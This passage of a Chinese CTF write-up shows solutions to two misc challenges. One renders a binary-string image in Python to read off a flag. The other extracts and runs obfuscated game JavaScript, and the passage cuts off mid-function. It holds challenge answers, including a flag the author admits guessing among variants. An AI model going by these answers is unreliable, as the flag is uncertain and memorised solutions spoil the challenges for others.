class="string">11111111111111111111111111111111111111111111111111111111111111111111000000011111100010011111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111100011111001111001111001111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111001111111101110011111101111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111110011111111110110111111101111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111110111111111110010111111100111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111110111111111111010111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111101111111111111000111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111101111111111111100111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111101111111111111100111111110011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111101111111111111100111111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111101111111111111111111111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111000000000011111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111110111111111100000000000000000001111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111101111111001111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111011111111101111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111110011111111100111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111110111111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111110111111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111110111111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111110000111111111111111111111111111111111111111110111111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111110000111111111111111111111111111111111111111111110111111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110001111111111111111111111111111111111111111111111110111111111101111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111110011111111111111111111111111111111111111111111111001111100001111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111100111111111111111111111111111111111111111111111110000001111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111110011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111110011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111100000000000000111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111101111111111110000000000111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111011111111111111111111110000111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111011111111111111111111111110011111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111011111111111111111111111111001111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111001111111111111111111111111100111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111101111111111111111111111111110111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111011111111111111111111111111100111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111100000111111111111111111111001111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111110000011111111111111110011111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111000000000000000001111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111101111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111100111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111011111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111011111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111101111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111101111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111110011111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111011111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111001111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111101111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111100111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110011111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111001111100000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111100000001111111100000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111001111111111111111111111111111111111111111111111000000000000000000000000001111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110011111111111111111111111111111111111111111111110011111111111111111111111100111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111100111111111111111111111111111111111111111111111100111111111111111111111111110011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111001111111111111111111111111111111111111111111111001111111111111111111111111111001111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111110011111111111111111111111111111111111111111111111000001111111111111111111111111001111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111100111111111111111111111111111111111111111111111111100111111111111111111111111100011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111001111111111111111111111111111111111111111111111111110000001111111111111000000001111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111111111111111111111111111111111111111111111111111100000000000000011111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111110011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111101111111111111110000000111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111110111111111111100111110001111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111011111111111111111111111111111111111111111111111111111111110111111111111001111111101111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11110011111111111111111111111111111111111111111111111111111111110111111111110011111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11100111111111111111111111111111111111111111111111111111111111111011111111110111111111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11101111111111111111111111111111111111111111111111111111111111111011111111110111111111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11101111111111111111111111111111111111111111111111111111111111111011111111110111111111111101111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11101111111111111111111111111111111111001111111111111111111111111011111111110111111111111101111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11101111111111111111111111111111111111101111111111111111111111111011111111110111111111111101111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11100111111111111111110000001111111111101111111111111111111111111011111111110111111111111100111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11110011111111111111100111100000011111101111111111111111111111111011111111110111111111111110111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111000000000000001011111111111100000001111111111111111111111111011111111110111111111111110111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111101011111111111111111111111111111111111111111110000000000110111111111111110111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111100011111111111111111111111111111111111111111111111111111000011111111111110111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111110111111111111111111111111111111111111111111111111111111111111111111111110111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111110111111111111111111111111111111111111111111111111111111111111111111111100111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111110000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111100111110011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111001111111011111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111011111111011111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111011111111001111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110011111111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110111111111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110111111111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110000000000000000000000000000000001111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111011111111111111111111111111111001111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111011111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111001111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110000011111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110111001111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110111101111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110111101111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110111101111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111001101111001111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111100001111011111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111000000011111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111100111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111110000111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111000001111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111100000011111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111000000001111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110001111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111000111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111100011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111110001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111100001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111100000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111100011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111100000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111110000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111110000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">print(dd.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">s=[<span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(s[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复制结果出来，有点难看，建议编译运行输出，把头转起来看。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322021104594.png" alt="image-20210322021104594"></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322021126912.png" alt="image-20210322021126912"></p><p>就不截图了。就一个一个读。</p><p>最后flag：Nep{Y0u_ar3_50_cl3ver!}</p><p>好像是这个，最后试了好几个。主要是0,o,l,1分不太清，排列组合，提交了一波。。</p><h3 id="2-冰峰历险记"><a href="#2-冰峰历险记" class="headerlink" title="2.冰峰历险记"></a>2.冰峰历险记</h3><p>逆向题，这就是第一天做出来的。</p><p>晚了一下，发现走到右下角有花，花出来，那些东西就停了。可以推宝箱进门，但是ida分析了一半天没出来，然后想在软件那个目录上找几个进程断一下，然后发现，点开一个打开了一个类似浏览器的控制台。。里面有这游戏的代码，好家伙，js逆向。。。</p><p>这不是js逆向嘛？跑misc来了？</p><p>不过逆向拿手，直接审计代码。。发现关键函数。</p><p>找到比对代码</p><p>使用<a href="https://www.html.cn/tool/js_beautify/%E4%BC%98%E5%8C%96%E4%B8%80%E4%B8%8B">https://www.html.cn/tool/js_beautify/优化一下</a></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322021958871.png" alt="image-20210322021958871"></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322021914751.png" alt="image-20210322021914751"></p><p>抠出来，跑一下。成功得到flag</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322075353457.png" alt="image-20210322075353457"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onButtonClick</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> _0x3771 = [<span class="string">&#x27;\x62\x6c\x65&#x27;</span>, <span class="string">&#x27;\x72\x61\x74\x75&#x27;</span>, <span class="string">&#x27;\x33\x39\x46\x32&#x27;</span>, <span class="string">&#x27;\x31\x4c\x49\x4a\x76\x65\x68&#x27;</span>, <span class="string">&#x27;\x32\x33\x6e\x79\x4f\x53\x75\x6d&#x27;</span>, <span class="string">&#x27;\x31\x36\x4d\x42\x73\x69\x7a\x6d&#x27;</span>, <span class="string">&#x27;\x34\x64\x4d\x50\x73\x48\x53&#x27;</span>, <span class="string">&#x27;\x2d\x31\x44\x45&#x27;</span>, <span class="string">&#x27;\x37\x33\x32\x39\x34\x56\x55\x4d\x52\x78\x52&#x27;</span>, <span class="string">&#x27;\x34\x41\x45\x31&#x27;</span>, <span class="string">&#x27;\x31\x31\x36\x31\x38\x38\x37\x55\x50\x47\x44\x6c\x68&#x27;</span>, <span class="string">&#x27;\x33\x36\x30\x39&#x27;</span>, <span class="string">&#x27;\x66\x6f\x6e\x74&#x27;</span>, <span class="string">&#x27;\x38\x44\x43\x33&#x27;</span>, <span class="string">&#x27;\x53\x69\x7a\x65&#x27;</span>, <span class="string">&#x27;\x36\x44\x36\x2d&#x27;</span>, <span class="string">&#x27;\x43\x6f\x6e\x67&#x27;</span>, <span class="string">&#x27;\x32\x33\x6b\x63\x4d\x7a\x4b\x65&#x27;</span>, <span class="string">&#x27;\x45\x35\x35\x38&#x27;</span>, <span class="string">&#x27;\x31\x35\x36\x35\x32\x35\x64\x50\x66\x52\x45\x49&#x27;</span>, <span class="string">&#x27;\x73\x74\x79\x6c&#x27;</span>, <span class="string">&#x27;\x6c\x61\x74\x69&#x27;</span>, <span class="string">&#x27;\x35\x63\x42\x4c\x49\x4e\x5a&#x27;</span>, <span class="string">&#x27;\x35\x35\x37\x33\x39\x68\x72\x6d\x41\x73\x6c&#x27;</span>, <span class="string">&#x27;\x4e\x65\x70\x7b&#x27;</span>, <span class="string">&#x27;\x36\x38\x38\x35\x38\x68\x6e\x55\x50\x43\x74&#x27;</span>, <span class="string">&#x27;\x31\x30\x39\x39\x36\x31\x68\x43\x6f\x45\x6e\x79&#x27;</span>, <span class="string">&#x27;\x76\x69\x73\x69&#x27;</span>, <span class="string">&#x27;\x6f\x6e\x73\x21&#x27;</span>, <span class="string">&#x27;\x34\x36\x30\x35\x31\x46\x66\x61\x70\x4f\x49&#x27;</span>, <span class="string">&#x27;\x74\x65\x78\x74&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> _0x336e = <span class="function"><span class="keyword">function</span> (<span class="params">_0x8710fc, _0xbfc9ff</span>) </span>&#123;</span><br><span class="line">        _0x8710fc = _0x8710fc - <span class="number">0xa9</span>;</span><br><span class="line">        <span class="keyword">var</span> _0x377162 = _0x3771[_0x8710fc];</span><br><span class="line">        <span class="keyword">return</span> _0x377162;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x422051 = _0x336e;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params">_0x5ea0a5, _0x23a2f6</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _0x4b1718 = _0x336e;</span><br><span class="line">        <span class="keyword">while</span> (!![]) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> _0x13718d = <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xb3</span>)) * -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xbb</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xb9</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xc4</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xac</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xc7</span>)) * -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xbc</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xaa</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xc5</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xbf</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xc6</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xb5</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">0xb8</span>));</span><br><span class="line">                <span class="keyword">if</span> (_0x13718d === _0x23a2f6) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">else</span> 